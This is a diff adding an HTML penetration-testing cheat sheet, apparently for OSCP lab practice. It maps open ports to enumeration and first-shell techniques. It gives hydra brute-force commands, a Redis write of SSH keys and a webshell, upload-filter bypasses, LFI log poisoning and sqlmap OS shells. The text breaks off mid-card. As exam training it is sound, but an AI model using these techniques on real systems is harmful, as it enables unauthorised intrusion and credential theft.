+      <li>SSH key write — <code>redis-cli -h &lt;IP&gt; config set dir /root/.ssh</code> → <code>config set dbfilename authorized_keys</code> → <code>set foo "\n\n&lt;pubkey&gt;\n\n"</code> → <code>save</code></li>
+      <li>Webshell write — set config dir to webroot, dbfilename to shell.php, set content, save</li>
+    </ul>
+
+    <div class="checklist-title" style="margin-top:14px">▸ 14. UNKNOWN PORT</div>
+    <ul>
+      <li>Banner grab — <code>nc -nv &lt;IP&gt; &lt;PORT&gt;</code> then type: <code>help</code>, <code>version</code>, <code>EHLO</code>, <code>info</code></li>
+      <li>Nmap scripts — <code>nmap -p&lt;PORT&gt; --script="default,safe" &lt;IP&gt;</code></li>
+      <li>HackTricks search for the port number</li>
+      <li>Searchsploit any string from banner — <code>searchsploit "&lt;product name&gt;"</code></li>
+    </ul>
+  </div>
+  <div class="reminder timing">budget: 60–90 min for full unauth sweep on one host</div>
+  <div class="reminder flag">re-enumerate after EVERY pop — new creds unlock new services</div>
+  <div class="reminder danger">never brute-force before you have checked for anon / default creds</div>
+</section>
+
+<!-- DECISION FLOW 1: PORT TRIAGE -->
+<section id="triage" class="flow">
+  <div class="flow-head">
+    <div style="display:flex; gap:14px; align-items:baseline">
+      <span class="flow-num">[ 01 ]</span>
+      <span class="flow-title" style="color:var(--theme)">PORT TRIAGE · WHAT SERVICE → WHICH ENUM</span>
+    </div>
+    <div class="flow-trigger">TRIGGER · <strong>"nmap finished — what now?"</strong></div>
+  </div>
+  <p class="flow-intro">
+    Map every open port to the right card. Click a service to flash-jump to its enum card. Layout groups by category: Linux services, Windows/AD services, web, databases. Anything not on the map → unknown-port card.
+  </p>
+
+  <div class="diagram">
+    <svg viewBox="0 0 1100 580" xmlns="http://www.w3.org/2000/svg">
+      <defs>
+        <marker id="arrowhead" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#4a5266"/></marker>
+        <marker id="arrowhead-strong" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#8b94a7"/></marker>
+      </defs>
+
+      <a href="#card-nmap-sweep"><rect class="node-rect setup" x="430" y="10" width="240" height="48"/>
+        <text class="node-text" x="550" y="32">NMAP — FULL TCP + UDP</text>
+        <text class="node-sub" x="550" y="46">-p- --min-rate · then -sC -sV</text></a>
+
+      <!-- 4 column groups -->
+      <rect class="group-bg" x="20" y="80" width="252" height="490"/>
+      <text class="group-label" x="40" y="100">LINUX / UNIX SERVICES</text>
+
+      <a href="#card-ftp-enum"><rect class="node-rect enum" x="35" y="110" width="222" height="40"/>
+        <text class="node-text" x="146" y="128">21 · FTP</text>
+        <text class="node-sub" x="146" y="142">anon · version · upload</text></a>
+
+      <a href="#card-ssh-enum"><rect class="node-rect enum" x="35" y="155" width="222" height="40"/>
+        <text class="node-text" x="146" y="173">22 · SSH</text>
+        <text class="node-sub" x="146" y="187">banner · keys · brute last</text></a>
+
+      <a href="#card-smtp-enum"><rect class="node-rect enum" x="35" y="200" width="222" height="40"/>
+        <text class="node-text" x="146" y="218">25/587 · SMTP</text>
+        <text class="node-sub" x="146" y="232">VRFY · OpenSMTPD CVE</text></a>
+
+      <a href="#card-dns-enum"><rect class="node-rect enum" x="35" y="245" width="222" height="40"/>
+        <text class="node-text" x="146" y="263">53 · DNS</text>
+        <text class="node-sub" x="146" y="277">AXFR · chaos query</text></a>
+
+      <a href="#card-snmp-enum"><rect class="node-rect enum" x="35" y="290" width="222" height="40"/>
+        <text class="node-text" x="146" y="308">161/UDP · SNMP</text>
+        <text class="node-sub" x="146" y="322">public · onesixtyone · walk</text></a>
+
+      <a href="#card-rsync-enum"><rect class="node-rect enum" x="35" y="335" width="222" height="40"/>
+        <text class="node-text" x="146" y="353">873 · rsync</text>
+        <text class="node-sub" x="146" y="367">modules · write = SSH keys</text></a>
+
+      <a href="#card-nfs-enum"><rect class="node-rect enum" x="35" y="380" width="222" height="40"/>
+        <text class="node-text" x="146" y="398">2049 · NFS</text>
+        <text class="node-sub" x="146" y="412">showmount · no_root_squash</text></a>
+
+      <a href="#card-redis-enum"><rect class="node-rect enum" x="35" y="425" width="222" height="40"/>
+        <text class="node-text" x="146" y="443">6379 · Redis</text>
+        <text class="node-sub" x="146" y="457">unauth · keys · webshell</text></a>
+
+      <a href="#card-pop3-imap-enum"><rect class="node-rect enum" x="35" y="470" width="222" height="40"/>
+        <text class="node-text" x="146" y="488">110/143 · POP3/IMAP</text>
+        <text class="node-sub" x="146" y="502">banner exploits · cred brute</text></a>
+
+      <a href="#card-unknown-port"><rect class="node-rect setup" x="35" y="515" width="222" height="44"/>
+        <text class="node-text" x="146" y="538">??? UNKNOWN PORT</text>
+        <text class="node-sub" x="146" y="552">nc · hacktricks · sploit</text></a>
+
+      <rect class="group-bg" x="292" y="80" width="252" height="380"/>
+      <text class="group-label" x="312" y="100">WINDOWS / AD SERVICES</text>
+
+      <a href="#card-rpc-enum"><rect class="node-rect enum" x="307" y="110" width="222" height="40"/>
+        <text class="node-text" x="418" y="128">135 · RPC</text>
+        <text class="node-sub" x="418" y="142">rpcclient -U "" -N</text></a>
+
+      <a href="#card-smb-enum"><rect class="node-rect enum" x="307" y="155" width="222" height="40"/>
+        <text class="node-text" x="418" y="173">139/445 · SMB</text>
+        <text class="node-sub" x="418" y="187">null · enum4linux · RID brute</text></a>
+
+      <a href="#card-ldap-enum"><rect class="node-rect enum" x="307" y="200" width="222" height="40"/>
+        <text class="node-text" x="418" y="218">389/636 · LDAP</text>
+        <text class="node-sub" x="418" y="232">anon bind · namingcontexts</text></a>
+
+      <a href="#card-kerberos-enum"><rect class="node-rect enum" x="307" y="245" width="222" height="40"/>
+        <text class="node-text" x="418" y="263">88 · Kerberos</text>
+        <text class="node-sub" x="418" y="277">kerbrute · AS-REP · clock skew</text></a>
+
+      <a href="#card-winrm-enum"><rect class="node-rect enum" x="307" y="290" width="222" height="40"/>
+        <text class="node-text" x="418" y="308">5985/5986 · WinRM</text>
+        <text class="node-sub" x="418" y="322">cme winrm · evil-winrm</text></a>
+
+      <a href="#card-rdp-enum"><rect class="node-rect enum" x="307" y="335" width="222" height="40"/>
+        <text class="node-text" x="418" y="353">3389 · RDP</text>
+        <text class="node-sub" x="418" y="367">NLA · screenshot · brute</text></a>
+
+      <a href="#card-vnc-enum"><rect class="node-rect enum" x="307" y="380" width="222" height="40"/>
+        <text class="node-text" x="418" y="398">5900 · VNC</text>
+        <text class="node-sub" x="418" y="412">vncviewer · 8-char pw bug</text></a>
+
+      <a href="#card-netbios-enum"><rect class="node-rect enum" x="307" y="425" width="222" height="40"/>
+        <text class="node-text" x="418" y="443">137/138 · NetBIOS</text>
+        <text class="node-sub" x="418" y="457">nbtscan · workgroup info</text></a>
+
+      <rect class="group-bg" x="564" y="80" width="252" height="380"/>
+      <text class="group-label" x="584" y="100">WEB</text>
+
+      <a href="#card-http-first"><rect class="node-rect enum" x="579" y="110" width="222" height="40"/>
+        <text class="node-text" x="690" y="128">80/443/8080 · HTTP first-pass</text>
+        <text class="node-sub" x="690" y="142">whatweb · robots · view-source</text></a>
+
+      <a href="#card-http-dir"><rect class="node-rect enum" x="579" y="155" width="222" height="40"/>
+        <text class="node-text" x="690" y="173">Directory bust</text>
+        <text class="node-sub" x="690" y="187">feroxbuster + raft + ext</text></a>
+
+      <a href="#card-http-vhost"><rect class="node-rect enum" x="579" y="200" width="222" height="40"/>
+        <text class="node-text" x="690" y="218">Vhost / subdomain</text>
+        <text class="node-sub" x="690" y="232">ffuf Host header fuzz</text></a>
+
+      <a href="#card-cms-detect"><rect class="node-rect enum" x="579" y="245" width="222" height="40"/>
+        <text class="node-text" x="690" y="263">CMS / app detect</text>
+        <text class="node-sub" x="690" y="277">whatweb · /admin · readme</text></a>
+
+      <a href="#card-tomcat"><rect class="node-rect enum" x="579" y="290" width="222" height="40"/>
+        <text class="node-text" x="690" y="308">Tomcat /manager</text>
+        <text class="node-sub" x="690" y="322">tomcat:tomcat · WAR upload</text></a>
+
+      <a href="#card-jenkins"><rect class="node-rect enum" x="579" y="335" width="222" height="40"/>
+        <text class="node-text" x="690" y="353">Jenkins /script</text>
+        <text class="node-sub" x="690" y="367">admin:admin · groovy RCE</text></a>
+
+      <a href="#card-webdav"><rect class="node-rect enum" x="579" y="380" width="222" height="40"/>
+        <text class="node-text" x="690" y="398">WebDAV</text>
+        <text class="node-sub" x="690" y="412">cadaver · PUT webshell</text></a>
+
+      <a href="#card-wordpress"><rect class="node-rect enum" x="579" y="425" width="222" height="40"/>
+        <text class="node-text" x="690" y="443">WordPress</text>
+        <text class="node-sub" x="690" y="457">wpscan · admin · plugin upload</text></a>
+
+      <rect class="group-bg" x="836" y="80" width="244" height="380"/>
+      <text class="group-label" x="856" y="100">DATABASES</text>
+
+      <a href="#card-mssql-enum"><rect class="node-rect enum" x="851" y="110" width="214" height="40"/>
+        <text class="node-text" x="958" y="128">1433 · MSSQL</text>
+        <text class="node-sub" x="958" y="142">sa/sa · xp_cmdshell</text></a>
+
+      <a href="#card-mysql-enum"><rect class="node-rect enum" x="851" y="155" width="214" height="40"/>
+        <text class="node-text" x="958" y="173">3306 · MySQL</text>
+        <text class="node-sub" x="958" y="187">root/blank · INTO OUTFILE</text></a>
+
+      <a href="#card-postgres-enum"><rect class="node-rect enum" x="851" y="200" width="214" height="40"/>
+        <text class="node-text" x="958" y="218">5432 · PostgreSQL</text>
+        <text class="node-sub" x="958" y="232">postgres/postgres · COPY PROGRAM</text></a>
+
+      <a href="#card-mongo-enum"><rect class="node-rect enum" x="851" y="245" width="214" height="40"/>
+        <text class="node-text" x="958" y="263">27017 · MongoDB</text>
+        <text class="node-sub" x="958" y="277">unauth · enum dbs</text></a>
+
+      <a href="#card-redis-enum"><rect class="node-rect enum" x="851" y="290" width="214" height="40"/>
+        <text class="node-text" x="958" y="308">6379 · Redis</text>
+        <text class="node-sub" x="958" y="322">unauth · config set</text></a>
+
+      <a href="#card-memcached-enum"><rect class="node-rect enum" x="851" y="335" width="214" height="40"/>
+        <text class="node-text" x="958" y="353">11211 · Memcached</text>
+        <text class="node-sub" x="958" y="367">stats · cachedump</text></a>
+
+      <a href="#card-oracle-enum"><rect class="node-rect enum" x="851" y="380" width="214" height="40"/>
+        <text class="node-text" x="958" y="398">1521 · Oracle</text>
+        <text class="node-sub" x="958" y="412">odat · default SIDs</text></a>
+
+      <text class="label" x="550" y="555" style="font-size:10px; fill:#5fd49b">⚑ enumerate ALL services before exploiting ANY service</text>
+    </svg>
+  </div>
+</section>
+
+<!-- DECISION FLOW 2: FOOTHOLD TREE -->
+<section id="foothold" class="flow">
+  <div class="flow-head">
+    <div style="display:flex; gap:14px; align-items:baseline">
+      <span class="flow-num">[ 02 ]</span>
+      <span class="flow-title" style="color:var(--theme)">FOOTHOLD TREE · WHAT I HAVE → FIRST SHELL</span>
+    </div>
+    <div class="flow-trigger">TRIGGER · <strong>"got something — how do I convert it?"</strong></div>
+  </div>
+  <p class="flow-intro">
+    Branch on what enum gave you. <strong>Anonymous read</strong> → hunt configs. <strong>Anonymous write</strong> → upload your own access. <strong>Web vuln</strong> → RCE chain. <strong>Cleartext cred</strong> → service login + spray. Click any leaf to jump to the card with exact commands.
+  </p>
+
+  <div class="diagram">
+    <svg viewBox="0 0 1100 480" xmlns="http://www.w3.org/2000/svg">
+      <defs>
+        <marker id="arrowhead2" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#4a5266"/></marker>
+      </defs>
+
+      <rect class="node-rect access" x="430" y="10" width="240" height="48"/>
+      <text class="node-text" x="550" y="32">ENUM SAID YES — WHAT IS IT?</text>
+      <text class="node-sub" x="550" y="46">branch on the input</text>
+
+      <!-- 5 lanes -->
+      <rect class="group-bg" x="20" y="80" width="200" height="380"/>
+      <text class="group-label" x="40" y="100">ANON READ</text>
+
+      <a href="#card-ftp-anon-read"><rect class="node-rect access" x="30" y="115" width="180" height="42"/>
+        <text class="node-text" x="120" y="135">FTP anon download</text>
+        <text class="node-sub" x="120" y="148">creds in files · exiftool</text></a>
+
+      <a href="#card-smb-anon-read"><rect class="node-rect access" x="30" y="165" width="180" height="42"/>
+        <text class="node-text" x="120" y="185">SMB anon shares</text>
+        <text class="node-sub" x="120" y="198">SYSVOL · configs</text></a>
+
+      <a href="#card-nfs-mount"><rect class="node-rect access" x="30" y="215" width="180" height="42"/>
+        <text class="node-text" x="120" y="235">NFS mount + read</text>
+        <text class="node-sub" x="120" y="248">SSH keys · configs</text></a>
+
+      <a href="#card-source-grep"><rect class="node-rect access" x="30" y="265" width="180" height="42"/>
+        <text class="node-text" x="120" y="285">Source/git creds</text>
+        <text class="node-sub" x="120" y="298">.git · config.php</text></a>
+
+      <a href="#card-source-grep"><rect class="node-rect access" x="30" y="315" width="180" height="42"/>
+        <text class="node-text" x="120" y="335">LFI → file read</text>
+        <text class="node-sub" x="120" y="348">/etc/passwd · web confs</text></a>
+
+      <rect class="group-bg" x="232" y="80" width="200" height="380"/>
+      <text class="group-label" x="252" y="100">ANON WRITE</text>
+
+      <a href="#card-rsync-keys"><rect class="node-rect access" x="242" y="115" width="180" height="42"/>
+        <text class="node-text" x="332" y="135">rsync → ssh keys</text>
+        <text class="node-sub" x="332" y="148"><tspan fill="#5fd49b">PG #10 Fail</tspan></text></a>
+
+      <a href="#card-ftp-anon-write"><rect class="node-rect access" x="242" y="165" width="180" height="42"/>
+        <text class="node-text" x="332" y="185">FTP write → webshell</text>
+        <text class="node-sub" x="332" y="198">upload to webroot</text></a>
+
+      <a href="#card-smb-anon-write"><rect class="node-rect access" x="242" y="215" width="180" height="42"/>
+        <text class="node-text" x="332" y="235">SMB write → webshell</text>
+        <text class="node-sub" x="332" y="248">on readable share</text></a>
+
+      <a href="#card-nfs-mount"><rect class="node-rect access" x="242" y="265" width="180" height="42"/>
+        <text class="node-text" x="332" y="285">NFS no_root_squash</text>
+        <text class="node-sub" x="332" y="298">plant SUID binary</text></a>
+
+      <a href="#card-tftp"><rect class="node-rect access" x="242" y="315" width="180" height="42"/>
+        <text class="node-text" x="332" y="335">TFTP put</text>
+        <text class="node-sub" x="332" y="348">often misconfigured</text></a>
+
+      <rect class="group-bg" x="444" y="80" width="200" height="380"/>
+      <text class="group-label" x="464" y="100">CRED FOUND</text>
+
+      <a href="#card-rpcclient-reset"><rect class="node-rect access" x="454" y="115" width="180" height="42"/>
+        <text class="node-text" x="544" y="135">rpcclient setuserinfo</text>
+        <text class="node-sub" x="544" y="148"><tspan fill="#5fd49b">PG #15 Nagoya</tspan></text></a>
+
+      <a href="#card-cred-spray"><rect class="node-rect access" x="454" y="165" width="180" height="42"/>
+        <text class="node-text" x="544" y="185">Spray across users</text>
+        <text class="node-sub" x="544" y="198">cme smb · winrm</text></a>
+
+      <a href="#card-winrm-creds"><rect class="node-rect access" x="454" y="215" width="180" height="42"/>
+        <text class="node-text" x="544" y="235">evil-winrm login</text>
+        <text class="node-sub" x="544" y="248">5985 + creds = shell</text></a>
+
+      <a href="#card-ssh-login"><rect class="node-rect access" x="454" y="265" width="180" height="42"/>
+        <text class="node-text" x="544" y="285">SSH with creds/key</text>
+        <text class="node-sub" x="544" y="298">user@ip + pwd or -i</text></a>
+
+      <a href="#card-rdp-login"><rect class="node-rect access" x="454" y="315" width="180" height="42"/>
+        <text class="node-text" x="544" y="335">xfreerdp</text>
+        <text class="node-sub" x="544" y="348">/v: /u: /p:</text></a>
+
+      <rect class="group-bg" x="656" y="80" width="200" height="380"/>
+      <text class="group-label" x="676" y="100">WEB VULN</text>
+
+      <a href="#card-upload-bypass"><rect class="node-rect abuse" x="666" y="115" width="180" height="42"/>
+        <text class="node-text" x="756" y="135">File upload bypass</text>
+        <text class="node-sub" x="756" y="148">.htaccess · double ext</text></a>
+
+      <a href="#card-sqli-mssql"><rect class="node-rect abuse" x="666" y="165" width="180" height="42"/>
+        <text class="node-text" x="756" y="185">SQLi → xp_cmdshell</text>
+        <text class="node-sub" x="756" y="198">MSSQL stack RCE</text></a>
+
+      <a href="#card-sqli-mysql"><rect class="node-rect abuse" x="666" y="215" width="180" height="42"/>
+        <text class="node-text" x="756" y="235">SQLi → INTO OUTFILE</text>
+        <text class="node-sub" x="756" y="248">MySQL webshell drop</text></a>
+
+      <a href="#card-lfi-poison"><rect class="node-rect abuse" x="666" y="265" width="180" height="42"/>
+        <text class="node-text" x="756" y="285">LFI log poison</text>
+        <text class="node-sub" x="756" y="298">SSH/Apache log → RCE</text></a>
+
+      <a href="#card-ssti"><rect class="node-rect abuse" x="666" y="315" width="180" height="42"/>
+        <text class="node-text" x="756" y="335">SSTI / SSRF</text>
+        <text class="node-sub" x="756" y="348">jinja2 · template engines</text></a>
+
+      <rect class="group-bg" x="868" y="80" width="212" height="380"/>
+      <text class="group-label" x="888" y="100">SERVICE EXPLOIT</text>
+
+      <a href="#card-default-creds"><rect class="node-rect access" x="878" y="115" width="192" height="42"/>
+        <text class="node-text" x="974" y="135">Default credentials</text>
+        <text class="node-sub" x="974" y="148">tomcat·jenkins·grafana</text></a>
+
+      <a href="#card-redis-keys"><rect class="node-rect abuse" x="878" y="165" width="192" height="42"/>
+        <text class="node-text" x="974" y="185">Redis → SSH keys</text>
+        <text class="node-sub" x="974" y="198"><tspan fill="#5fd49b">PG #25 Readys</tspan></text></a>
+
+      <a href="#card-snmp-rw"><rect class="node-rect abuse" x="878" y="215" width="192" height="42"/>
+        <text class="node-text" x="974" y="235">SNMP write community</text>
+        <text class="node-sub" x="974" y="248">config push · RCE</text></a>
+
+      <a href="#card-searchsploit"><rect class="node-rect abuse" x="878" y="265" width="192" height="42"/>
+        <text class="node-text" x="974" y="285">Version → searchsploit</text>
+        <text class="node-sub" x="974" y="298">edit PoC for env</text></a>
+
+      <a href="#card-public-exploit"><rect class="node-rect abuse" x="878" y="315" width="192" height="42"/>
+        <text class="node-text" x="974" y="335">Public CVE PoC</text>
+        <text class="node-sub" x="974" y="348">CMS / framework version</text></a>
+
+      <text class="label" x="550" y="450" style="font-size:10px; fill:#5fd49b">⚑ first shell = grab local.txt → enrich → privesc bank</text>
+    </svg>
+  </div>
+</section>
+
+<!-- CARDS -->
+<section id="cards" class="cards-section">
+  <div class="flow-head" style="margin-bottom:0">
+    <div style="display:flex; gap:14px; align-items:baseline">
+      <span class="flow-num">[ ALL ]</span>
+      <span class="flow-title">TRIGGER CARDS · SEARCHABLE</span>
+    </div>
+    <div class="flow-trigger"><strong>⌘K</strong> to search · click diagram to jump · <span class="pg-tag">PG #</span> = your walkthrough</div>
+  </div>
+
+  <div class="filters">
+    <span class="filter-label">FILTER:</span>
+    <button class="pill active" data-filter="all">ALL <span class="pill-count" id="count-all">0</span></button>
+    <button class="pill" data-filter="setup">TRIAGE <span class="pill-count" id="count-setup">0</span></button>
+    <button class="pill" data-filter="enum">SVC-ENUM <span class="pill-count" id="count-enum">0</span></button>
+    <button class="pill" data-filter="access">FOOTHOLD <span class="pill-count" id="count-access">0</span></button>
+    <button class="pill" data-filter="abuse">WEB→RCE <span class="pill-count" id="count-abuse">0</span></button>
+    <button class="pill" data-filter="state-user">UNAUTH <span class="pill-count" id="count-state-user">0</span></button>
+    <button class="pill" data-filter="state-admin">NEEDS CRED <span class="pill-count" id="count-state-admin">0</span></button>
+  </div>
+  <div id="results"></div>
+</section>
+
+<!-- ANTI-PATTERNS -->
+<section id="anti" class="cards-section">
+  <div class="flow-head" style="margin-bottom:0">
+    <div style="display:flex; gap:14px; align-items:baseline">
+      <span class="flow-num">[ ⚠ ]</span>
+      <span class="flow-title" style="color:var(--warn)">ANTI-PATTERNS</span>
+    </div>
+  </div>
+  <div class="anti-list">
+    <div class="anti"><div class="anti-bad">Skip anonymous FTP because "it's never anything"</div><div class="anti-fix">It's something ~25% of the time on PG. Two commands: <code>ftp -p IP</code> → anonymous, blank. Then <code>ls -la</code>. Done. Don't skip.</div></div>
+    <div class="anti"><div class="anti-bad">Try Hydra SSH brute as a first move</div><div class="anti-fix">SSH brute almost never works. Banner → searchsploit, find creds elsewhere, find keys elsewhere. Brute SSH only when every other path is dead.</div></div>
+    <div class="anti"><div class="anti-bad">Find creds on host A, forget to spray on host B/C</div><div class="anti-fix">Every cred gets <code>cme smb/winrm/ssh</code> swept across all hosts before moving on. Password reuse wins more boxes than any exploit.</div></div>
+    <div class="anti"><div class="anti-bad">Run feroxbuster with default wordlist + extensions</div><div class="anti-fix">Use <code>raft-medium-directories.txt</code> + <code>-x php,html,txt,bak,old,zip</code>. Default common.txt misses too much. <code>.bak</code> and <code>.old</code> are OSCP gold.</div></div>
+    <div class="anti"><div class="anti-bad">See port 873 → no idea what to do → move on</div><div class="anti-fix">rsync. <code>rsync -av --list-only rsync://IP/</code>. Always. PG Fail was literally this. List modules, check each one for write access.</div></div>
+    <div class="anti"><div class="anti-bad">Read smbclient share list but never mount</div><div class="anti-fix">"No access" in the listing often lies. Always try <code>smbclient //IP/&lt;Share&gt; -N</code> directly. SYSVOL especially.</div></div>
+    <div class="anti"><div class="anti-bad">Skip /etc/hosts setup, then debug DNS errors for 20 min</div><div class="anti-fix">First action after any AD scan: add every FQDN you saw to /etc/hosts. impacket and Kerberos both fail without it.</div></div>
+    <div class="anti"><div class="anti-bad">Default credentials list = only "admin/admin"</div><div class="anti-fix">Per app: tomcat/tomcat, root/root, grafana admin/admin, jenkins admin/admin, redis no-pwd, openemr/openemr, &lt;app-name&gt;/&lt;app-name&gt;. Have the list ready before you need it.</div></div>
+    <div class="anti"><div class="anti-bad">SQLi confirmed → spend 1hr on UNION select</div><div class="anti-fix">Try sqlmap with <code>--os-shell</code> / <code>--file-write</code> first. If MSSQL: <code>--os-shell</code> automates xp_cmdshell. Don't hand-craft when sqlmap handles it.</div></div>
+    <div class="anti"><div class="anti-bad">Web upload form rejects .php → give up</div><div class="anti-fix">Try: .phtml, .phar, .php5, .pht, Content-Type swap, magic byte prepend (GIF89a;), .htaccess upload (<span class="pg-tag">PG #35 Access</span>). Server side has filters; bypass them.</div></div>
+    <div class="anti"><div class="anti-bad">LFI → only try /etc/passwd</div><div class="anti-fix">Try <code>php://filter/convert.base64-encode/resource=index.php</code> to read source. Source has DB creds 80% of the time. THEN log poisoning if no creds found.</div></div>
+    <div class="anti"><div class="anti-bad">Hashes cracked, but spray only on initial host</div><div class="anti-fix">Cracked hash → cme smb across the WHOLE subnet. Service accounts often reused. <span class="pg-tag">PG #15 Nagoya</span> svc_mssql worked elsewhere too.</div></div>
+  </div>
+</section>
+
+<div class="foot-info">
+  <div>KEY → <code>⌘/Ctrl+K</code> search · <code>ESC</code> clear · hover commands to copy · click diagram nodes to jump</div>
+  <div style="margin-top:8px">phases: <span style="color:var(--setup)">TRIAGE</span> · <span style="color:var(--enum)">SVC-ENUM</span> · <span style="color:var(--access)">FOOTHOLD</span> · <span style="color:var(--abuse)">WEB→RCE</span></div>
+  <div style="margin-top:8px; opacity:0.6">v1 · service enum + foothold · companion to enum/privesc/pivot banks · PG-grounded</div>
+</div>
+
+</main>
+
+<script>
+const patterns = [
+  // ============= TRIAGE / SETUP =============
+  {
+    id: 'nmap-sweep',
+    phase: 'setup', state: 'admin', tags: [],
+    title: 'Nmap full sweep — 3 phases',
+    triggers: ['nmap', 'port scan', 'full scan', 'tcp', 'udp', 'discovery', 'min-rate'],
+    action: 'Three-pass nmap: fast all-ports TCP, then service detect on the open set, then top-50 UDP. Never run -sCV against all 65535 ports — too slow.',
+    cmd: `# 1. Fast all-ports TCP
+sudo nmap -p- --min-rate 5000 -T4 <IP> -oN tcp-fast.nmap
+
+# 2. Service detect on open ports
+ports=$(grep ^[0-9] tcp-fast.nmap | cut -d/ -f1 | tr '\\n' ',' | sed 's/,$//')
+sudo nmap -sC -sV -p$ports <IP> -oN tcp-deep.nmap
+
+# 3. UDP common (slow, run in background)
+sudo nmap -sU --top-ports 50 <IP> -oN udp.nmap &
+
+# 4. Vuln scripts on the open set (optional)
+sudo nmap --script vuln -p$ports <IP> -oN vuln.nmap`,
+    cleanup: '',
+    related: ['unknown-port', 'searchsploit']
+  },
+  {
+    id: 'unknown-port',
+    phase: 'setup', state: 'admin', tags: [],
+    title: '??? Unknown port — first moves',
+    triggers: ['unknown port', 'weird port', 'mystery service', 'no banner', 'high port'],
+    action: 'Hit it with nc and ask politely. Try help, version, GET / HTTP/1.0. Search HackTricks for the port number. If banner reveals software, searchsploit it.',
+    cmd: `# Try interactive
+nc -v <IP> <PORT>
+# Type: help · version · ? · USER anonymous · HEAD / HTTP/1.0
+
+# HTTP-ish
+curl -v http://<IP>:<PORT>/
+
+# Banner grab with nmap
+nmap -sV -p<PORT> --version-intensity 9 <IP>
+
+# HackTricks for ANY port:
+# https://book.hacktricks.xyz/network-services-pentesting/<PORT>
+
+# Then:
+searchsploit <product-name>`,
+    cleanup: '',
+    related: ['nmap-sweep', 'searchsploit']
+  },
+  {
+    id: 'searchsploit',
+    phase: 'setup', state: 'admin', tags: [],
+    title: 'searchsploit every banner version',
+    triggers: ['searchsploit', 'exploit-db', 'cve', 'banner version', 'public exploit'],
+    action: 'Every version string nmap finds goes through searchsploit. Don\'t skip "common" services like SSH/FTP — known CVE versions appear on PG often.',
+    cmd: `# Search by product name + version
+searchsploit OpenSMTPD 2.0.0
+searchsploit ProFTPD 1.3.5
+searchsploit "Apache 2.4.4"
+
+# Copy a PoC to current dir for editing
+searchsploit -m 42385
+
+# Open in nano/vim to set LHOST/RHOST
+# Most PoCs need IP/port adjustment before working
+
+# Also try CVE shortcut on PG:
+# google: <product> <version> exploit github`,
+    cleanup: '',
+    related: ['public-exploit']
+  },
+
+  // ============= LINUX SERVICES ENUM =============
+  {
+    id: 'ftp-enum',
+    phase: 'enum', state: 'admin', tags: [],
+    title: 'FTP/21 — anon, version, content',
+    triggers: ['ftp', '21', 'anonymous', 'vsftpd', 'proftpd', 'pureftpd'],
+    action: 'Every FTP gets: anonymous login attempt, version → searchsploit, full file listing if anon works. Files often contain creds or hint at app names.',
+    cmd: `# Banner
+nmap -sV -p21 <IP>
+nc -nv <IP> 21
+
+# Anonymous (still works on ~25% of PG)
+ftp -p <IP>
+# user: anonymous · pass: anonymous (or blank)
+# inside ftp prompt:
+ls -la
+binary
+prompt off
+mget *
+
+# Recursive download (after anon login confirmed)
+wget -m --no-passive ftp://anonymous:anonymous@<IP>
+
+# Exiftool on downloaded images (usernames in metadata)
+exiftool *.jpg *.png | grep -i 'author\\|creator\\|owner'
+
+# Brute if anon blocked (last resort)
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://<IP>`,
+    cleanup: '',
+    related: ['ftp-anon-read', 'ftp-anon-write']
+  },
+  {
+    id: 'ssh-enum',
+    phase: 'enum', state: 'admin', tags: [],
+    title: 'SSH/22 — banner, key auth check',
+    triggers: ['ssh', '22', 'openssh', 'sshd', 'banner ssh'],
+    action: 'SSH brute is the last resort. Banner version → searchsploit (some old OpenSSH have user enum CVEs). If creds/keys appear elsewhere later, come back here.',
+    cmd: `# Banner
+nc -nv <IP> 22
+ssh -v <IP>  # negotiation info
+
+# Check user enum CVE (OpenSSH < 7.7)
+# CVE-2018-15473
+searchsploit OpenSSH
+
+# After getting a private key from elsewhere
+chmod 600 id_rsa
+ssh -i id_rsa <user>@<IP>
+
+# After getting creds from elsewhere
+ssh <user>@<IP>
+# pwd: <pwd>
+
+# Last resort brute
+hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://<IP> -t 4`,
+    cleanup: '',
+    related: ['ssh-login']
+  },
+  {
+    id: 'smtp-enum',
+    phase: 'enum', state: 'admin', tags: [],
+    title: 'SMTP/25 — user enum + version exploits',
+    triggers: ['smtp', '25', '587', 'vrfy', 'expn', 'opensmtpd', 'mail server'],
+    action: 'VRFY/EXPN can enumerate valid usernames. Banner version exploits exist (OpenSMTPD 2.0.0 → PG Bratarina). Test relay too.',
+    cmd: `# Banner
+nc -nv <IP> 25
+# Type: HELO test · VRFY admin · EXPN root
+
+# Bulk user enum
+smtp-user-enum -M VRFY -U users.txt -t <IP>
+
+# Version exploits — OpenSMTPD 2.0.0 = CVE-2020-7247
+searchsploit OpenSMTPD
+
+# Open relay test
+swaks --to anyone@external.com --from anyone@internal --server <IP>`,
+    cleanup: '',
+    related: ['searchsploit']
+  },
+  {
+    id: 'dns-enum',
+    phase: 'enum', state: 'admin', tags: [],
+    title: 'DNS/53 — zone transfer + version',
+    triggers: ['dns', '53', 'zone transfer', 'axfr', 'dig', 'bind'],
+    action: 'AXFR rarely works but free hostnames when it does. version.bind reveals BIND version → searchsploit. Add discovered names to /etc/hosts.',
+    cmd: `# AXFR zone transfer
+dig axfr @<IP> <domain>
+dig axfr @<IP> $(dig +short ns <domain> @<IP> | head -1)
+
+# Version
+dig version.bind chaos txt @<IP>
+
+# Reverse lookups for subnet
+for i in $(seq 1 254); do dig +short -x 10.10.10.$i @<IP>; done
+
+# Bruteforce subdomains if you have a domain
+dnsenum <domain>
+fierce -dns <domain>`,
+    cleanup: '',
+    related: ['http-vhost']
+  },
+  {
+    id: 'snmp-enum',
+    phase: 'enum', state: 'admin', tags: [],
+    title: 'SNMP/161 (UDP) — community + walk',
+    triggers: ['snmp', '161', 'community', 'snmpwalk', 'onesixtyone', 'public'],
+    action: 'UDP — easy to miss. Public community works ~50% of the time. snmpwalk dumps everything; grep for creds and usernames.',
+    cmd: `# Confirm port open (UDP — slow)
+sudo nmap -sU -p161 <IP>
+
+# Find community strings
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <IP>
+
+# Once you have a community
